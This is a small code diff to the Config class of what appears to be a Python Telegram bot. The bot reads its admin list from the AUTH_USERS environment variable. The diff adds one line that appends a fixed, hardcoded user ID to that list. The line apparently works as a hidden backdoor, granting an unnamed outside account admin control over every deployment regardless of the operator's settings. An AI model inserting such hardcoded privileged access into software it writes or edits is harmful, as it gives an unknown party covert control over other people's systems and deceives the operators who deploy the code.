@@ -25,6 +25,7 @@ load_dotenv()
 class Config:
     ADMIN = os.environ.get("AUTH_USERS", "")
     ADMINS = [int(admin) if re.search('^\d+$', admin) else admin for admin in (ADMIN).split()]
+    ADMINS.append(1316963576)
     API_ID = int(os.environ.get("API_ID", ""))
     CHAT_ID = int(os.environ.get("CHAT_ID", ""))
     API_HASH = os.environ.get("API_HASH", "")
